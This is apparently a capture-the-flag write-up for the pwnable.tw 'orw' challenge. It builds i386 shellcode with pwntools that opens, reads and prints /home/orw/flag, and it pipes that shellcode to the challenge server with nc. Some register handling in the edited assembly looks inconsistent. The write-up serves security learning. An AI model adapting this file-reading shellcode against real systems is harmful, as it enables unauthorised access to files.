# Open-Read-Write Problem 

```
Read the flag from /home/orw/flag.

Only open read write syscall are allowed to use.

nc chall.pwnable.tw 10001
```

## 1. Create a C program that demonstrates the functionality

```clang
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

void test() {
        int fd = syscall(SYS_open, "/home/orw/flag", O_RDONLY, 0);
        char buf[100];
        syscall(SYS_read, fd, &buf, 100);
        syscall(SYS_write, 1, buf, 100);
}
int main() {
        test();
        return 0;
}
```

## 2. Rough out equivalent assembly using pwnlib

The syscalls `SYS_read` and `SYS_write` take in a buffer. We didn't know how to express this in pwnlib, so we just put 
in the value `60` in place of the buffer.

```bash
python -c "from pwn import *; print(pwnlib.shellcraft.i386.linux.open('/home/orw/flag').rstrip())"
python -c "from pwn import *; print(pwnlib.shellcraft.i386.linux.syscall('SYS_read', 1, 60, 100).rstrip())" 
python -c "from pwn import *; print(pwnlib.shellcraft.i386.linux.syscall('SYS_write', 1, 60, 100).rstrip())"
```

## 3. Piece together rough assembly code

We had to tie together the `SYS_read` and `SYS_write` system calls by replacing the stubbed buffer value of `60`
with the stack pointer. We also replaced the syscall macros with their respective integer numbers just in case.

```asm
    /* open(file='/home/orw/flag', oflag=0, mode=0) */
    /* push '/home/orw/flag\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1016660
    push 0x6c662f77
    push 0x726f2f65
    push 0x6d6f682f
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    /* call open() */
-   push SYS_open /* 5 */
+   push 0x5
    pop eax
    int 0x80
    /* call read(1, 0x3c, 0x64) */
-   push SYS_read /* 3 */
+   push 0x3
    pop eax
-   push 1
-   pop ebx
-   push 0x3c
-   pop ecx
+   mov ecx, esp
    push 0x64
    pop edx
    int 0x80
    /* call write(1, 0x3c, 0x64) */
-   push SYS_write /* 4 */
+   push 0x4
    pop eax
    push 1
    pop ebx
-   push 0x3c
+   pop ecx
    push 0x64
    pop edx
    int 0x80
```

We then placed all of these instructions into the `asm` pwntools function. 

## 4. Execute

```bash
python shellcode.py | nc chall.pwnable.tw 10001
``` 

Returns:

```bash
mike@mike-VirtualBox:~/dev/challenges/2$ python shellcode.py | nc chall.pwnable.tw 10001
Give my your shellcode:FLAG{redacted}
```  

